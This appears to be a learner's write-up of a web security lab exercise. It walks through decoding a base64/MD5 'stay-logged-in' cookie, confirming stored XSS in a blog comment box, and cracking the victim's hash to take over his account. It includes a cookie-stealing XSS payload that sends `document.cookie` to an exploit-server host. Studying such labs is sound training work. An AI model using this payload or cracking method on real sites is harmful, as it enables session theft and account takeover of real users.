## Lab 9 - Offline password cracking  
**End Goal** - Obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page. 

---
### Analysis: 
We have:  
Our own Credentials - `wiener:peter`  
Victim Username - `carlos`  

Same as before:
```md
The Site Uses `Remember Me` option to create a persistent cookie, so that it remembers the user.  
  
- Logged in to `wiener:peter`, while capturing all the traffci using the burp proxy.  

- In the POST req body it sends my `username=wiener&password=peter&stay-logged-in=on`, noticed that `stay-logged-in=on`?  
 
- Because it's on, now in addition to giving me `302 Found` and `Location:/my-account?id=wiener`Header, it also gave a `Set-Cookie:` Header with a persistent cookie.  
  
- The cookie looked like simple base64 at first so i decoded it and got `wiener:51dc30ddc473d43a6011e9ebba6ca770`, and we see there is another encoded value, it's length is 32 characters and it has digits and alphabets b/w `0-9`, `a-f`, so it most probably is a MD5 hash.  

- I gave my normal password `peter` to a md5 hash generator and it reurned `51dc30ddc473d43a6011e9ebba6ca770` so yes the persistent cookie is nothing but `base64(username:md5-hash-of-password)`.
```  
- Opened a blog post, there was a comment box below.  

- Gave a simple XSS payload `<script>alert(1)</script>`, then refreshed it, and it gave me the alert. that confirms that it is vulnerable to XSS.  

- So i gave the next XSS payload to steal another users `stay-logged-in` cookie and send it to my exploit server (that is given by the lab itself).  
  
- Payload: `<script>document.location='//MY-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>'`  
  
- After this i checked my exploit server's log and i could see a Get request that had `stay-logged-in` cookie of carlos.  
  
- So now why did i got the stay-logged-in cookie of carlos and not someone else?  
That is because after my script got stored in the backed (Stored XSS), Carlos was the first person to open that same blog and that's why the script ran in his browser and sent the stay-logged-in cookie to my server, and after carlos anyone who opens that blog their cookie will be sent to my exploit server.  
  
- Then i decoded the base64 and got `carlos:26323c16d5f4dabff3bb136f2460a943`, if it is a very known hash you can find out the password just by searching on google, so i searched that hash and got the password as `onceuponatime`.  
  
- But it's not recommended to search the hash directly into the browser, insted we can use a tool like `hashcat`.  
  
- Then i just logged in as carlos using the credentials i found `carlos:onceuponatime` and deleted the account.  
 